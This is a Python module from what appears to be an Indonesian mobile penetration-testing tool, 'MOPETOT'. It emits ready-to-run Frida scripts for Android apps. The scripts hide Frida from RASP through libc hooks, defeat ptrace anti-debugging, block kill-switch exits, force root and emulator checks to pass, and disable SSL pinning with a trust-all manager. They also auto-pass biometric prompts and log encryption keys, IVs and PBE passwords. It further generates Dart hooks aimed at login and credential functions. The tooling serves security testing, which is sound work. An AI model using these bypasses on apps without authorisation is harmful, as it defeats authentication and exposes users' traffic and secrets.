        detected = [k for k, v in prof.items() if v and k != "rasp_label"]
        header_features = []
        if prof["anti_frida"]:
            header_features.append("[0] Anti-Frida-Detection (native libc: strstr/fgets/connect/access)")
        if prof["anti_debug"]:
            header_features.append("[0b] Anti-Debug bypass (ptrace + isDebuggerConnected)")
        if prof["commercial"]:
            header_features.append("[1] RASP Kill-Switch Guard (System.exit/killProcess diblokir)")
        if prof["rootbeer"]:
            header_features.append("[2] RootBeer spesifik (semua checker -> false)")
        if prof["anti_vm"]:
            header_features.append("[3] Anti-VM bypass (qemu/goldfish/ranchu)")
        header_features.append("[4] Universal SSL Pinning Bypass (SSLContext/OkHttp/Conscrypt/WebView)")
        header_features.append("[4b] Root detection bypass (path luas + Runtime.exec)")
        header_features.append("[4c] BiometricPrompt auto-pass")
        if prof["crypto"]:
            header_features.append("[5] Crypto dumper (key + IV + plaintext/ciphertext)")
        if prof["flutter"]:
            header_features.append("[6] Flutter note: Dart logic TIDAK tersentuh Java hook")

        script = _JS_HEADER_TEMPLATE \
            .replace("__PKG__", package_name) \
            .replace("__RASP__", prof["rasp_label"]) \
            .replace("__FEATURES__", "\n *   ".join(header_features)) \
            .replace("__DETECTED__", ", ".join(detected) or "tidak ada proteksi terdeteksi")

        native_section = "\n".join(blocks_native) if blocks_native else ""
        java_section = "\n".join(blocks_java)

        script = script.replace("__NATIVE_BLOCKS__", native_section)
        script = script.replace("__JAVA_BLOCKS__", java_section)
        script = script.replace("__PKG2__", package_name)
        return script



# ======================================================================
# JS BLOCK TEMPLATES (RASP-aware Frida bypass generator)
# Catatan: string JS polos (bukan f-string) — brace aman.
# ======================================================================

_JS_HEADER_TEMPLATE = """/**
 * ==============================================================================
 * RASP-AWARE Frida Bypass Suite — MOPETOT (Mobile Penetration Testing Otomation)
 * Target Package : __PKG__
 * RASP Detected  : __RASP__
 * Profile flags  : __DETECTED__
 * Fitur aktif:
 *   __FEATURES__
 *
 * PENTING - urutan jalan:
 *   blok [0] native aktif duluan (menyembunyikan jejak frida dari RASP),
 *   baru blok Java (bypass fungsional). Semua blok ada log — hook yang
 *   gagal TIDAK diam-diam.
 *
 * Cara pakai (spawn, paling awet untuk RASP):
 *   frida -U -f __PKG__ -l bypass_hooks.js
 * Rekomendasi tambahan untuk RASP komersial:
 *   - rename frida-server (contoh: /data/local/tmp/mysv) + port non-default
 *     (frida-server -l 127.0.0.1:8888)
 *   - magisk denylist / magiskhide utk hide root
 * ==============================================================================
 */
(function () {
__NATIVE_BLOCKS__

    Java.perform(function () {
        function tryBlock(name, fn) {
            try {
                fn();
                console.log("[+] [" + name + "] aktif.");
            } catch (e) {
                console.log("[-] [" + name + "] GAGAL: " + e);
            }
        }

__JAVA_BLOCKS__
        console.log("[*] [Frida] RASP-aware bypass siap untuk __PKG2__.");
    });
})();
"""

_JS_ANTI_FRIDA_NATIVE = """    // ==========================================================================
    // [0] ANTI-FRIDA-DETECTION (NATIVE) — palsuin hasil libc check RASP
    // ==========================================================================
    try {
        var FRIDA_MARKS = ["frida", "gum-js", "gmain", "gdbus", "linjector",
                           "re.frida", "frida-agent", "frida-server", "frida-helper"];
        function hasFridaMark(s) {
            if (!s) return false;
            s = s.toLowerCase();
            for (var i = 0; i < FRIDA_MARKS.length; i++) {
                if (s.indexOf(FRIDA_MARKS[i]) > -1) return true;
            }
            return false;
        }

        // strstr("...", "frida") -> NULL
        var p_strstr = Module.findExportByName(null, "strstr");
        if (p_strstr) {
            Interceptor.attach(p_strstr, {
                onEnter: function (args) { this.needle = Memory.readCString(args[1]); },
                onLeave: function (retval) {
                    if (hasFridaMark(this.needle)) retval.replace(ptr(0));
                }
            });
        }
        var p_strcasestr = Module.findExportByName(null, "strcasestr");
        if (p_strcasestr) {
            Interceptor.attach(p_strcasestr, {
                onEnter: function (args) { this.needle = Memory.readCString(args[1]); },
                onLeave: function (retval) {
                    if (hasFridaMark(this.needle)) retval.replace(ptr(0));
                }
            });
        }
        // fgets: scrub baris yang menyebut frida (dipakai baca /proc/self/maps)
        var p_fgets = Module.findExportByName(null, "fgets");
        if (p_fgets) {
            Interceptor.attach(p_fgets, {
                onLeave: function (retval) {
                    if (!retval.isNull()) {
                        try {
                            var line = Memory.readCString(retval);
                            if (hasFridaMark(line)) {
                                Memory.writeUtf8String(retval, "# scrubbed");
                            }
                        } catch (e) {}
                    }
                }
            });
        }
        // connect() ke port frida (27042/27043) -> gagal
        var p_connect = Module.findExportByName(null, "connect");
        if (p_connect) {
            Interceptor.attach(p_connect, {
                onEnter: function (args) {
                    this.block = false;
                    try {
                        var sa = args[1];
                        var family = Memory.readU16(sa);
                        if (family === 2) {
                            var port = (Memory.readU8(sa.add(2)) << 8) | Memory.readU8(sa.add(3));
                            if (port === 27042 || port === 27043) this.block = true;
                        }
                    } catch (e) {}
                },
                onLeave: function (retval) {
                    if (this.block) retval.replace(-1);
                }
            });
        }
        // access()/stat() ke path frida-server -> ENOENT
        var p_access = Module.findExportByName(null, "access");
        if (p_access) {
            Interceptor.attach(p_access, {
                onEnter: function (args) {
                    try { this.path = Memory.readCString(args[0]); } catch (e) { this.path = null; }
                    this.block = hasFridaMark(this.path);
                },
                onLeave: function (retval) {
                    if (this.block) retval.replace(-1);
                }
            });
        }
        console.log("[+] [AntiFrida] native libc hooks aktif (strstr/fgets/connect/access).");
    } catch (e) {
        console.log("[-] [AntiFrida] " + e);
    }
"""

_JS_ANTI_DEBUG_NATIVE = """    // ==========================================================================
    // [0b] ANTI-DEBUG (NATIVE) — ptrace self-check -> sukses palsu
    // ==========================================================================
    try {
        var p_ptrace = Module.findExportByName(null, "ptrace");
        if (p_ptrace) {
            Interceptor.attach(p_ptrace, {
                onLeave: function (retval) { retval.replace(0); }
            });
            console.log("[+] [AntiDebug] ptrace hook aktif.");
        }
    } catch (e) {
        console.log("[-] [AntiDebug] " + e);
    }
"""

_JS_RASP_EXIT_GUARD = """        // ======================================================================
        // [1] RASP KILL-SWITCH GUARD — protektor komersial sering bunuh diri
        //     (exit/killProcess) saat deteksi. Kita blokir + log siapa yang manggil.
        // ======================================================================
        tryBlock("RASP-ExitGuard", function () {
            var JSystem = Java.use("java.lang.System");
            JSystem.exit.overload("int").implementation = function (code) {
                console.log("[!] [RASP-ExitGuard] System.exit(" + code + ") DIBLOKIR — kemungkinan kill-switch RASP.");
                return;
            };
            var JRuntime = Java.use("java.lang.Runtime");
            JRuntime.exit.overload("int").implementation = function (code) {
                console.log("[!] [RASP-ExitGuard] Runtime.exit(" + code + ") DIBLOKIR.");
                return;
            };
            var JProcess = Java.use("android.os.Process");
            JProcess.killProcess.overload("int").implementation = function (pid) {
                console.log("[!] [RASP-ExitGuard] killProcess(" + pid + ") DIBLOKIR.");
                return;
            };
        });
"""

_JS_ROOTBEER = """        // ======================================================================
        // [2] ROOTBEER SPESIFIK — scanner mendeteksi library ini di corpus
        // ======================================================================
        tryBlock("RootBeer", function () {
            var RootBeer = Java.use("com.scottyab.rootbeer.RootBeer");
            var checkers = ["isRooted", "isAccessGiven", "isSuBinaryPresent", "isBusyboxBinaryPresent",
                            "isSelinuxFlagInEnabled", "detectRootManagementApps",
                            "detectPotentiallyDangerousApps", "detectTestKeys",
                            "checkForBinary", "checkForBusyBoxBinary", "checkForMagiskBinary",
                            "checkForDangerousProperties", "checkForRootNative",
                            "isInstalledFromGooglePlay", "isRunningOnEmulator"];
            checkers.forEach(function (m) {
                try {
                    RootBeer[m].overloads.forEach(function (ov) {
                        ov.implementation = function () {
                            console.log("[+] [RootBeer] " + m + "() -> false");
                            return false;
                        };
                    });
                } catch (e) {
                    console.log("[-] [RootBeer] " + m + ": " + e);
                }
            });
        });
"""

_JS_ANTI_VM = """        // ======================================================================
        // [3] ANTI-VM BYPASS — scanner mendeteksi in-app anti-VM check
        // ======================================================================
        tryBlock("AntiVM", function () {
            var SysProps = Java.use("android.os.SystemProperties");
            SysProps.get.overload("java.lang.String").implementation = function (key) {
                if (key === "ro.kernel.qemu" || key === "ro.kernel.qemu.gles") return "0";
                if (key === "ro.hardware") return "qcom";
                if (key === "ro.product.device" || key === "ro.product.board") return "walleye";
                if (key === "ro.build.tags") return "release-keys";
                return this.get.call(this, key);
            };
            var Build = Java.use("android.os.Build");
            var FINGERPRINT = "google/walleye/walleye:8.1.0/OPM1.171019.011:user/release-keys";
            try { Build.FINGERPRINT.value = FINGERPRINT; } catch (e) {}
            try { Build.HARDWARE.value = "qcom"; } catch (e) {}
            try { Build.MODEL.value = "Pixel 2"; } catch (e) {}
            try { Build.TAGS.value = "release-keys"; } catch (e) {}
        });
"""

_JS_SSL_PINNING = """        // ======================================================================
        // [4] UNIVERSAL SSL PINNING BYPASS
        // ======================================================================
        tryBlock("SSL-SSLContext", function () {
            var X509TrustManager = Java.use("javax.net.ssl.X509TrustManager");
            var SSLContext = Java.use("javax.net.ssl.SSLContext");
            var TrustManager = Java.registerClass({
                name: "com.mopetot.TrustAllManager",
                implements: [X509TrustManager],
                methods: {
                    checkClientTrusted: function (chain, authType) {},
                    checkServerTrusted: function (chain, authType) {},
                    getAcceptedIssuers: function () { return []; }
                }
            });
            var TrustManagers = [TrustManager.$new()];
            var SSLContext_init = SSLContext.init.overload(
                "[Ljavax.net.ssl.KeyManager;", "[Ljavax.net.ssl.TrustManager;", "Ljava.security.SecureRandom;"
            );
            SSLContext_init.implementation = function (keyManager, trustManager, secureRandom) {
                console.log("[+] [SSL] SSLContext.init() -> TrustAllManager");
                SSLContext_init.call(this, keyManager, TrustManagers, secureRandom);
            };
        });

        tryBlock("SSL-Conscrypt", function () {
            // vector pinning paling umum Android modern (OkHttp via TrustManagerFactory)
            var TrustManagerImpl = Java.use("com.android.org.conscrypt.TrustManagerImpl");
            TrustManagerImpl.checkServerTrusted.overload(
                "[Ljava.security.cert.X509Certificate;", "java.lang.String", "java.net.Socket"
            ).implementation = function (chain, authType, socket) {
                console.log("[+] [SSL] TrustManagerImpl.checkServerTrusted(Socket) bypassed");
                return;
            };
            TrustManagerImpl.checkServerTrusted.overload(
                "[Ljava.security.cert.X509Certificate;", "java.lang.String", "javax.net.ssl.SSLEngine"
            ).implementation = function (chain, authType, engine) {
                console.log("[+] [SSL] TrustManagerImpl.checkServerTrusted(SSLEngine) bypassed");
                return;
            };
        });

        tryBlock("SSL-OkHttp", function () {
            var CertificatePinner = Java.use("okhttp3.CertificatePinner");
            CertificatePinner.check.overload("java.lang.String", "java.util.List").implementation = function (hostname, peerCertificates) {
                console.log("[+] [SSL] OkHttp3 CertificatePinner.check(List) bypassed: " + hostname);
                return;
            };
            CertificatePinner.check.overload("java.lang.String", "[Ljava.security.cert.Certificate;").implementation = function (hostname, peerCertificates) {
                console.log("[+] [SSL] OkHttp3 CertificatePinner.check(Array) bypassed: " + hostname);
                return;
            };
        });

        tryBlock("SSL-OkHttp4-Internal", function () {
            // OkHttp 4.x internal method check$okhttp — di-guard biar versi lain gak error
            var CP = Java.use("okhttp3.CertificatePinner");
            ["check$okhttp", "check$okhttp$android"].forEach(function (m) {
                try {
                    CP[m].overloads.forEach(function (ov) {
                        ov.implementation = function () {
                            console.log("[+] [SSL] CertificatePinner." + m + "() bypassed");
                            return;
                        };
                    });
                } catch (e) {}
            });
        });

        tryBlock("SSL-WebView", function () {
            var WebViewClient = Java.use("android.webkit.WebViewClient");
            WebViewClient.onReceivedSslError.implementation = function (view, handler, error) {
                console.log("[+] [SSL] WebViewClient.onReceivedSslError() -> proceed");
                handler.proceed();
            };
        });
"""

_JS_ROOT = """        // ======================================================================
        // [4b] ROOT DETECTION BYPASS — path luas + Runtime.exec filtering
        // ======================================================================
        tryBlock("Root", function () {
            var SU_PATHS = ["/system/bin/su", "/system/xbin/su", "/sbin/su", "/su/bin/su",
                            "/system/sd/xbin/su", "/data/local/su", "/data/local/xbin/su",
                            "/data/local/bin/su", "/data/local/tmp/su", "/system/bin/failsafe/su",
                            "/system/app/Superuser.apk", "/system/app/SuperSU",
                            "/system/bin/magisk", "/sbin/magisk", "/data/adb/magisk",
                            "/data/adb/magisk.db", "/data/local/tmp/magisk",
                            "/vendor/bin/su", "/system/bin/.ext/su", "/sbin/.magisk"];
            var File = Java.use("java.io.File");
            File.exists.implementation = function () {
                var path = this.getAbsolutePath();
                for (var i = 0; i < SU_PATHS.length; i++) {
                    if (path.indexOf(SU_PATHS[i]) > -1) {
                        console.log("[+] [Root] hide path: " + path);
                        return false;
                    }
                }
                if (path.indexOf("qemu_pipe") > -1 || path.indexOf("goldfish") > -1 ||
                    path.indexOf("vbox") > -1 || path.indexOf("genymotion") > -1) {
                    console.log("[+] [AntiVM] hide path: " + path);
                    return false;
                }
                return this.exists.call(this);
            };
            var Runtime_ = Java.use("java.lang.Runtime");
            Runtime_.exec.overload("java.lang.String").implementation = function (cmd) {
                if (cmd && (cmd.indexOf("which su") > -1 || cmd.indexOf("which busybox") > -1)) {
                    console.log("[+] [Root] Runtime.exec('" + cmd + "') -> diganti 'true'");
                    return this.exec.call(this, "true");
                }
                return this.exec.call(this, cmd);
            };
            var SysProps = Java.use("android.os.SystemProperties");
            SysProps.get.overload("java.lang.String").implementation = function (key) {
                if (key === "ro.build.tags" || key === "ro.debuggable") return "release-keys";
                if (key === "ro.secure") return "1";
                return this.get.call(this, key);
            };
        });
"""

_JS_BIOMETRIC = """        // ======================================================================
        // [4c] BIOMETRIC AUTO-PASS — semua overload + legacy FingerprintManager
        // ======================================================================
        tryBlock("Biometric", function () {
            var BP = Java.use("androidx.biometric.BiometricPrompt");
            BP.authenticate.overloads.forEach(function (ov) {
                ov.implementation = function () {
                    console.log("[+] [Biometric] authenticate() -> auto-success");
                    try {
                        var cb = this.mAuthenticationCallback.value;
                        if (cb && cb.onAuthenticationSucceeded) {
                            cb.onAuthenticationSucceeded(null);
                        }
                    } catch (e) {
                        console.log("[-] [Biometric] callback field rename? " + e);
                    }
                    return;
                };
            });
        });
        tryBlock("Biometric-Legacy", function () {
            var FM = Java.use("android.hardware.fingerprint.FingerprintManager");
            FM.authenticate.overloads.forEach(function (ov) {
                ov.implementation = function () {
                    console.log("[+] [Biometric] FingerprintManager.authenticate() -> auto-success");
                    return;
                };
            });
        });
"""

_JS_CRYPTO = """        // ======================================================================
        // [5] CRYPTO DUMPER — key + IV + plaintext/ciphertext terkorelasi
        // ======================================================================
        tryBlock("Crypto", function () {
            function toHex(bytes) {
                if (!bytes) return "null";
                var hex = "";
                for (var i = 0; i < bytes.length; i++) {
                    var b = (bytes[i] & 0xFF).toString(16);
                    if (b.length === 1) b = "0" + b;
                    hex += b;
                }
                return hex;
            }
            var SecretKeySpec = Java.use("javax.crypto.spec.SecretKeySpec");
            SecretKeySpec.$init.overload("[B", "java.lang.String").implementation = function (keyBytes, algorithm) {
                console.log("[KEY] SecretKeySpec(" + algorithm + "): " + toHex(keyBytes));
                return this.$init(keyBytes, algorithm);
            };
            var IvParameterSpec = Java.use("javax.crypto.spec.IvParameterSpec");
            IvParameterSpec.$init.overload("[B").implementation = function (iv) {
                console.log("[IV] IvParameterSpec: " + toHex(iv));
                return this.$init(iv);
            };
            var PBEKeySpec = Java.use("javax.crypto.spec.PBEKeySpec");
            PBEKeySpec.$init.overload("[C").implementation = function (password) {
                var pw = "";
                for (var i = 0; i < password.length; i++) pw += String.fromCharCode(password[i]);
                console.log("[KEY] PBE password: " + pw);
                return this.$init(password);
            };
            var Cipher = Java.use("javax.crypto.Cipher");
            Cipher.doFinal.overloads.forEach(function (ov) {
                ov.implementation = function () {
                    var res = ov.apply(this, arguments);
                    var algo = "?";
                    try { algo = this.getAlgorithm(); } catch (e) {}
                    var iv = "n/a";
                    try { iv = toHex(this.getIV()); } catch (e) {}
                    console.log("[CIPHER] " + algo + " | IV=" + iv + " | inLen=" + (arguments.length ? (arguments[0] && arguments[0].length ? arguments[0].length : "?") : "?") + " | outLen=" + (res && res.length ? res.length : "?"));
                    return res;
                };
            });
        });
"""

_JS_FLUTTER = """        // ======================================================================
        // [6] CATATAN FLUTTER — target ini app Flutter (libapp.so terdeteksi)
        //     Java hook TIDAK menyentuh logic Dart. Untuk traffic/bypass Dart:
        //     1) reFlutter (rebuild engine): pip install reflutter
        //     2) Hook BoringSSL di libflutter.so jika symbol tersedia:
        // ======================================================================
        tryBlock("Flutter-Native", function () {
            ["ssl_verify_cert_chain", "ssl_verify_server_cert", "SSL_get_verify_result"].forEach(function (sym) {
                try {
                    var addr = Module.findExportByName("libflutter.so", sym);
                    if (addr) {
                        Interceptor.attach(addr, {
                            onLeave: function (retval) {
                                retval.replace(0);
                                console.log("[+] [Flutter] " + sym + "() -> 0 (cert diterima)");
                            }
                        });
                    }
                } catch (e) {}
            });
        });
"""



# ======================================================================
# Build payload PoC (dipanggil dari app.py — bisa dijalankan di process
# pool terpisah supaya tidak berebut GIL dengan event loop server:
# Live Verifier tetap responsif saat PoC di-generate).
# ======================================================================

POC_PAYLOAD_VERSION = 2  # v2: + secret_pocs (PoC siap jalan per temuan Secrets & Keys)


def build_pocs_payload(scan_obj: dict, manifest_obj: dict, corpus_dir: Path,
                       secrets: List[Dict[str, Any]] = None) -> dict:
    """Rakit seluruh payload PoC (komponen, deeplink, secret) — CPU/IO berat."""
    poc_engine = PoCEngine(corpus_dir=corpus_dir if corpus_dir and corpus_dir.exists() else None)
    pkg_name = (manifest_obj or {}).get("package_name") or scan_obj.get("package_name") or "com.target.app"

    comps_raw = []
    deeplinks_raw = []
    if manifest_obj:
        try:
            comps_raw = json.loads(manifest_obj.get("components") or "[]")
        except Exception:
            comps_raw = []
        try:
            deeplinks_raw = json.loads(manifest_obj.get("deep_links") or "[]")
        except Exception:
            deeplinks_raw = []

    component_pocs = []
    if isinstance(comps_raw, list):
        for c in comps_raw:
            if isinstance(c, dict) and (c.get("exported") in (True, "true", "True")):
                component_pocs.append(poc_engine.generate_component_poc(pkg_name, c))

    deeplink_pocs = []
    for dl in deeplinks_raw:
        if isinstance(dl, str):
            dl_str = dl
        elif isinstance(dl, list):
            # scheme/host list bisa berisi None — saring sebelum join
            parts = [str(x) for x in dl if x]
            dl_str = "://".join(parts) if parts else ""
        else:
            dl_str = str(dl) if dl else ""
        if not dl_str:
            continue
        deeplink_pocs.append(poc_engine.generate_deeplink_poc(pkg_name, dl_str))

    # Tier 1: PoC siap jalan per temuan Secrets & Keys (deterministic template)
    secret_pocs = poc_engine.generate_secret_pocs(secrets or [])

    return {
        "package_name": pkg_name,
        "component_pocs": component_pocs,
        "deeplink_pocs": deeplink_pocs,
        "secret_pocs": secret_pocs,
        "poc_version": POC_PAYLOAD_VERSION,
        "total_pocs": len(component_pocs) + len(deeplink_pocs) + len(secret_pocs),
    }


# ======================================================================
# DART HOOK GENERATOR (dari hasil blutter: asm/ per package)
# Auto-generate Frida hook presisi untuk function Dart yang menarik
# (login/auth/token/crypto/credential) pada package app sendiri.
# ======================================================================

_DART_INTERESTING = re.compile(
    r"(?i)\b(login|signin|sign_in|signup|auth|token|password|credential|"
    r"encrypt|decrypt|sign|secret|api_?key|verify_?otp|otp|refresh|"
    r"interceptor|session|pin|passcode|biometric)\b")
_DART_METHOD_LINE = re.compile(r"^\s*_?\s*([A-Za-z_$][\w$<>]*)\s*\(")
_DART_ADDR_LINE = re.compile(r"//\s*\*\*\s*addr:\s*(0x[0-9a-f]+)")
# package ekosistem yang hampir pasti bukan business logic app
_DART_LIB_PKGS_PREFIX = ("flutter", "dart", "_flutterfire", "firebase_", "plugin")


def _parse_dart_functions(asm_dir: Path):
    """Parse asm/<pkg>/...: hasil [(pkg, class, method, addr)] menarik."""
    out = []
    if not asm_dir.exists():
        return out
    for pkg_dir in sorted(asm_dir.iterdir()):
        if not pkg_dir.is_dir():
            continue
        pkg = pkg_dir.name
        for f in pkg_dir.rglob("*"):
            if not f.is_file():
                continue
            try:
                lines = f.read_text(encoding="utf-8", errors="replace").splitlines()
            except OSError:
                continue
            cls = ""
            last_method = ""
            for line in lines:
                m = re.match(r"^class\s+([\w$]+)", line)
                if m:
                    cls = m.group(1)
                    continue
                mm = _DART_METHOD_LINE.match(line)
                if mm and not line.strip().startswith("//"):
                    last_method = mm.group(1)
                    continue
                ma = _DART_ADDR_LINE.search(line)
                if ma and last_method:
                    if _DART_INTERESTING.search(last_method) or _DART_INTERESTING.search(cls):
                        out.append((pkg, cls, last_method, ma.group(1)))
                    last_method = ""
    return out


def generate_dart_hook_script(blutter_dir: Path, app_package: str,
                              max_hooks: int = 15) -> str:
    """Generate Frida script dengan hook presisi dari hasil blutter.

    Template dasar = blutter_frida.js (helper object dumper dari blutter);
    body onLibappLoaded diganti hook per function Dart yang menarik.
    """
    frida_tpl = blutter_dir / "blutter_frida.js"
    if not frida_tpl.exists():
        raise FileNotFoundError("blutter_frida.js tidak ada — jalankan blutter dulu")
    tpl = frida_tpl.read_text(encoding="utf-8", errors="replace")

    funcs = _parse_dart_functions(blutter_dir / "asm")
    app_pkg = _match_dart_app_pkg(sorted({f[0] for f in funcs}), app_package)
    # prioritas: package app sendiri; sisanya non-library
    own = [f for f in funcs if f[0] == app_pkg]
    others = [f for f in funcs
              if not any(f[0].lower().startswith(p) for p in _DART_LIB_PKGS_PREFIX)]
    selected = own if own else others
    # dedupe (class, method) — overloading sama cukup satu hook
    seen = set()
    uniq = []
    for f in selected:
        key = (f[1], f[2])
        if key in seen:
            continue
        seen.add(key)
        uniq.append(f)
    uniq = uniq[:max_hooks]

    hook_blocks = []
    for pkg, cls, method, addr in uniq:
        label = (cls + "::" if cls else "") + method
        hook_blocks.append(
            f"    // [{pkg}] {label}\n"
            f"    Interceptor.attach(libapp.add({addr}), {{\n"
            f"        onEnter: function () {{\n"
            f"            init(this.context);\n"
            f"            console.log('[DART-HOOK] {label} dipanggil');\n"
            f"            for (var ai = 0; ai < 4; ai++) {{\n"
            f"                try {{\n"
            f"                    let objPtr = getArg(this.context, ai);\n"
            f"                    const [tptr, c2, values] = getTaggedObjectValue(objPtr);\n"
            f"                    console.log(`  arg${{ai}} ${{c2.name}}@${{tptr.toString().slice(2)}} =`, JSON.stringify(values, null, 1));\n"
            f"                }} catch (e) {{}}\n"
            f"            }}\n"
            f"        }}\n"
            f"    }});\n")
    if not hook_blocks:
        hook_blocks.append(
            "    // Tidak ada function Dart menarik yang terdeteksi di asm/.\n"
            "    // Cari manual di pp.txt / asm/ lalu tambahkan hook di sini.\n")

    body = ("    // Hook presisi di-generate MOPETOT dari hasil blutter "
            f"({len(uniq)} function, package: {app_pkg or '?'})\n" + "".join(hook_blocks))

    # ganti body onLibappLoaded pada template
    start = tpl.index("function onLibappLoaded() {")
    open_end = tpl.index("{", start) + 1
    close = tpl.index("\n}", open_end)
    script = tpl[:open_end] + "\n" + body + tpl[close:]
    header = (
        "/**\n"
        " * MOPETOT — Dart Function Hook Script (auto-generated dari blutter)\n"
        f" * Target: {app_package or '?'} | hook: {len(uniq)} function Dart\n"
        " * Pakai bersama blutter_frida.js helpers (sudah include di bawah).\n"
        " * Jalankan: frida -U -f <package> -l dart_hooks.js\n"
        " */\n")
    return header + script


# ======================================================================
# DART UTILITIES (blutter): inspector, diff, AI context, routes
# ======================================================================

_DART_TTL_CACHE: Dict[str, Any] = {}  # asm_dir -> {"mtime": ..., "funcs": [...]}

def _match_dart_app_pkg(dart_pkgs, app_package: str) -> str:
    """Cocokkan package Dart dengan android package.
    Kasus: com.pegadaianagen -> dart 'agen' (suffix), com.foo.barapp -> 'barapp'."""
    target = (app_package or "").lower().replace("_", "")
    if not target:
        return ""
    last = target.split(".")[-1]
    for p in dart_pkgs:
        if p.lower() == last:
            return p
    # substring: dart pkg ada di dalam nama android package (ambil terpanjang)
    cands = sorted((p for p in dart_pkgs if p and p.lower() in target), key=len, reverse=True)
    return cands[0] if cands else ""




def _parse_dart_functions_all(asm_dir: Path) -> List[tuple]:
    """Semua function Dart dari asm/ (pkg, class, method, addr) + cache mtime."""
    if not asm_dir.exists():
        return []
    try:
        stamp = asm_dir.stat().st_mtime
    except OSError:
        return []
    key = str(asm_dir)
    cached = _DART_TTL_CACHE.get(key) or {}
    if cached.get("mtime") == stamp and cached.get("funcs"):
        return cached["funcs"]
    out = []
    for pkg_dir in sorted(asm_dir.iterdir()):
        if not pkg_dir.is_dir():
            continue
        for f in pkg_dir.rglob("*"):
            if not f.is_file():
                continue
            try:
                lines = f.read_text(encoding="utf-8", errors="replace").splitlines()
            except OSError:
                continue
            cls = ""
            last_method = ""
            rel = str(f.relative_to(asm_dir.parent))
            for line in lines:
                m = re.match(r"^class\s+([\w$]+)", line)
                if m:
                    cls = m.group(1)
                    continue
                mm = _DART_METHOD_LINE.match(line)
                if mm and not line.strip().startswith("//"):
                    last_method = mm.group(1)
                    continue
                ma = _DART_ADDR_LINE.search(line)
                if ma and last_method:
                    out.append((pkg_dir.name, cls, last_method, ma.group(1), rel))
                    last_method = ""
    _DART_TTL_CACHE[key] = {"mtime": stamp, "funcs": out}
    return out


def dart_packages(blutter_dir: Path) -> List[Dict[str, Any]]:
    """Inventory package Dart dari hasil blutter (+ jumlah function)."""
    asm = blutter_dir / "asm"
    if not asm.exists():
        return []
    funcs = _parse_dart_functions_all(asm)
    counts: Dict[str, int] = {}
    for pkg, _, _, _, _ in funcs:
        counts[pkg] = counts.get(pkg, 0) + 1
    out = [{"package": p, "functions": counts.get(p, 0)} for p in sorted(counts)]
    return out


def dart_package_detail(blutter_dir: Path, package: str) -> List[Dict[str, Any]]:
    """Detail function satu package Dart (file, class, method, addr)."""
    asm = blutter_dir / "asm"
    funcs = _parse_dart_functions_all(asm)
    return [
        {"file": rel, "cls": cls, "method": method, "addr": addr}
        for pkg, cls, method, addr, rel in funcs if pkg == package
    ]


def dart_routes(blutter_dir: Path, corpus_dir: Path, limit: int = 200) -> List[str]:
    """Daftar route Flutter (dari flutter_routes.txt corpus / strings Dart)."""
    routes_file = corpus_dir / "flutter_dart" / "flutter_routes.txt"
    if routes_file.exists():
        try:
            raw = [r.strip() for r in routes_file.read_text(encoding="utf-8",
                    errors="replace").splitlines() if r.strip()]
            # hanya route yang valid: mulai huruf, min 3 char per segmen pertama
            good = [r for r in raw if re.match(r"^/[a-z][a-z0-9_-]{2,}(?:/[a-z0-9_.-]+)*$", r, re.I)]
            return (good or raw)[:limit]
        except OSError:
            return []
    return []


def summarize_dart_context(blutter_dir: Path, app_package: str,
                           cap: int = 2500) -> str:
    """Ringkasan class/function Dart app (package app sendiri) untuk konteks AI.
    Fokus: class auth/login/crypto/credential/api + jumlah total per class."""
    asm = blutter_dir / "asm"
    funcs = _parse_dart_functions_all(asm)
    app_pkg = _match_dart_app_pkg(sorted({f[0] for f in funcs}), app_package)
    own = [f for f in funcs if f[0] == app_pkg]
    if not own:
        return ""
    classes: Dict[str, List[str]] = {}
    for _, cls, method, _, _ in own:
        if not cls:
            continue
        methods = classes.setdefault(cls, [])
        if method not in methods and len(methods) < 12:
            methods.append(method)
    # nama class CamelCase (AuthDataStore) tidak match  regex method — pakai substring.
    # keyword kuat (auth/login/credential/...) didahulukan sebelum yang lemah (api/user/...)
    _strong = re.compile(r"(?i)(login|auth|token|password|credential|encrypt|"
                         r"decrypt|secret|otp|session|pin|sign)")
    _weak = re.compile(r"(?i)(api|user|account|key|security|otp)")
    strong_cls = {c: m for c, m in classes.items()
                  if _strong.search(c) or any(_DART_INTERESTING.search(x) for x in m)}
    weak_cls = {c: m for c, m in classes.items()
                if c not in strong_cls and _weak.search(c)}
    other_cls = {c: m for c, m in classes.items() if c not in strong_cls and c not in weak_cls}
    # skor relevansi: nama class bobot 3, method menarik +1; class UI (Widget/
    # Screen/Page/State) didemote supaya class logika (AuthDataStore) naik duluan
    _ui = re.compile(r"(?i)(widget|screen|page|state|view)$|^_")
    def _score(c, m):
        sc = sum(3 for _ in _strong.finditer(c))
        sc += sum(1 for x in m if _DART_INTERESTING.search(x))
        if _ui.search(c):
            sc *= 0.4
        return -sc
    ranked = sorted(strong_cls.items(), key=lambda kv: (_score(kv[0], kv[1]), kv[0]))
    lines = [f"Dart app package '{app_pkg}': {len(classes)} class, {len(own)} function."]
    for c, methods in ranked[:12]:
        lines.append(f"- {c}: {', '.join(methods)}")
    for c, methods in list(weak_cls.items())[:6]:
        lines.append(f"- {c}: {', '.join(methods[:6])}")
    if other_cls:
        shown = list(other_cls.items())[:6]
        lines.append("- class lain (sampel): " + "; ".join(f"{c}({len(m)}+ fn)"
                    for c, m in shown))
    text = "\n".join(lines)
    return text[:cap]


def dart_function_diff(dir_a: Path, dir_b: Path) -> Dict[str, Any]:
    """Diff function Dart dua hasil blutter (versi app berbeda).
    Bandingkan (pkg, class, method): added / removed / addr_changed."""
    fa = {(p, c, m): addr for p, c, m, addr, _ in _parse_dart_functions_all(dir_a / "asm")}
    fb = {(p, c, m): addr for p, c, m, addr, _ in _parse_dart_functions_all(dir_b / "asm")}
    added = sorted(k for k in fb if k not in fa)
    removed = sorted(k for k in fa if k not in fb)
    changed = [k for k in fb if k in fa and fa[k] != fb[k]]
    return {
        "added": [{"package": p, "cls": c, "method": m, "addr": fb[(p, c, m)]} for p, c, m in added],
        "removed": [{"package": p, "cls": c, "method": m} for p, c, m in removed],
        "addr_changed_count": len(changed),
        "addr_changed_sample": [{"package": p, "cls": c, "method": m,
                                 "old": fa[(p, c, m)], "new": fb[(p, c, m)]}
                                for (p, c, m) in sorted(changed)[:20]],
        "total_a": len(fa), "total_b": len(fb),
    }


def generate_mitm_addon(package_name: str, hosts: List[str],
                        api_paths: List[str]) -> str:
    """Generate mitmproxy addon: log & tag request yang match surface app
    (host endpoint + api path dari scan) — pasangan dinamis dari statis."""
    hosts_js = ", ".join('"%s"' % h for h in hosts[:40]) or '"__none__"'
